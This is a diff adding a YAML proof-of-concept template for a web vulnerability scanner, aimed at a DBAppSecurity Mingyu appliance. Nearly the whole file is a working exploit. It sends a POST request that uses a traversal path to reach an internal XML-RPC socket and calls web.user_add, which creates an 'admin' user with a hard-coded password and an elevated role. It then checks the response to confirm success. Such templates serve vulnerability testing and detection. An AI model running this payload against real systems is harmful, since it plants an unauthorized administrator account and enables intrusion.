@@ -1,0 +1,103 @@
+name: poc-yaml-dbappsecurity-mingyu-xmlrpc-sock-adduser
+manual: true
+transport: http
+set:
+    host: request.url.host
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://admin/wsrpc
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |-
+                <?xml version="1.0"?>
+                <methodCall>
+                <methodName>web.user_add</methodName>
+                <params>
+                <param>
+                <value>
+                <array>
+                <data>
+                <value>
+                <string>admin</string>
+                </value>
+                <value>
+                <string>5</string>
+                </value>
+                <value>
+                <string>{{host}}</string>
+                </value>
+                </data>
+                </array>
+                </value>
+                </param>
+                <param>
+                <value>
+                <struct>
+                <member>
+                <name>uname</name>
+                <value>
+                <string>admin</string>
+                </value>
+                </member>
+                <member>
+                <name>name</name>
+                <value>
+                <string>admin</string>
+                </value>
+                </member>
+                <member>
+                <name>pwd</name>
+                <value>
+                <string>1qaz@3edC12345</string>
+                </value>
+                </member>
+                <member>
+                <name>authmode</name>
+                <value>
+                <string>1</string>
+                </value>
+                </member>
+                <member>
+                <name>deptid</name>
+                <value>
+                <string></string>
+                </value>
+                </member>
+                <member>
+                <name>email</name>
+                <value>
+                <string></string>
+                </value>
+                </member>
+                <member>
+                <name>mobile</name>
+                <value>
+                <string></string>
+                </value>
+                </member>
+                <member>
+                <name>comment</name>
+                <value>
+                <string></string>
+                </value>
+                </member>
+                <member>
+                <name>roleid</name>
+                <value>
+                <string>102</string>
+                </value>
+                </member>
+                </struct></value>
+                </param>
+                </params>
+                </methodCall>
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.icontains("<methodResponse>") && response.body_string.icontains("<params>") && response.body_string.icontains("\"errmsg\":") && (response.body_string.icontains("\"USER_EXISTS\"") || response.body_string.icontains("\"DEPT_NOT_EXISTS\""))
+expression: r0()
+detail:
+    author: 小r
+    links:
+        - https://cn-sec.com/archives/1947658.html
